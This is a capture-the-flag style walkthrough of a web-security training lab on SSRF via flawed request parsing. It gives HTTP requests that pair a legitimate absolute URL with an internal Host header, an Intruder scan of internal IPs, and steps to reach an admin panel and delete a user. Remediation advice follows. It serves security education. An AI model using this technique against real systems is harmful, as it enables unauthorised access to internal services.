# Lab: SSRF via Flawed Request Parsing

**Category:** HTTP Host Header Attacks
**Difficulty:** Practitioner
**Lab link:** [SSRF via flawed request parsing](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-ssrf-via-flawed-request-parsing)

## Overview

The front-end proxy validates the host in the **absolute URL** (request line) but routes based on the **Host header**. By putting the legitimate lab domain in the absolute URL (passes validation) and an internal IP in the `Host` header (determines routing), you can reach internal services that would normally be blocked.

## Key Concepts

- **Flawed parsing:** The proxy checks the wrong field for security — it validates the absolute URL host but routes to the `Host` header value.
- **Absolute URL in request line:** `GET https://<legitimate-host>/path HTTP/1.1` — the proxy sees the known domain and passes validation.
- **Host header for routing:** `Host: 192.168.0.X` — the proxy uses this to determine where to forward the request.
- **Scan needed:** The internal admin IP must be discovered via Intruder.

## Attack Pattern

```http
GET https://<lab>.web-security-academy.net/admin HTTP/1.1
Host: 192.168.0.X
Cookie: session=<session>; _lab=<lab-cookie>
```

- Proxy validates: `https://<lab>...` → known domain ✅
- Proxy routes to: `Host: 192.168.0.X` → internal admin server

## Solution

### Step 1 — Scan for internal admin IP

Send to Intruder with payload position on the Host header:
```
Host: 192.168.0.§0§
```
Request line keeps the legitimate lab URL. Look for a **different response length** (not just status code) among all results — the internal admin server will stand out.

### Step 2 — Fetch admin page

```http
GET https://<lab>.web-security-academy.net/admin HTTP/1.1
Host: 192.168.0.X
Cookie: session=<session>; _lab=<lab-cookie>
```

Retrieve the CSRF token from the response.

### Step 3 — Delete carlos

```http
GET https://<lab>.web-security-academy.net/admin/delete?csrf=TOKEN&username=carlos HTTP/1.1
Host: 192.168.0.X
Cookie: session=<session>; _lab=<lab-cookie>
```

Lab solved.

## Common Mistakes

- **Putting the internal IP in the absolute URL** — this gets blocked (the proxy validates the absolute URL host against a whitelist).
- **Putting the legitimate host in both** — routes to the real server, not internal.
- **Not checking response lengths** — all responses may show 403 as the status code, but the internal server will have a different length. Sort Intruder results by length.

## Remediation

- Validate the `Host` header, not just the absolute URL host — they must match and both must be on the allowlist.
- Reject requests where the `Host` header differs from the absolute URL host.
- Use network-level controls to prevent the proxy from routing to internal IPs.

## Key Takeaways

- "Flawed request parsing" = the proxy validates one field (absolute URL) but routes on another (Host header).
- Always scan by response **length** in Intruder, not just status code — 403s with different lengths reveal internal servers.
- The legitimate domain in the absolute URL is the key to bypassing proxy validation.
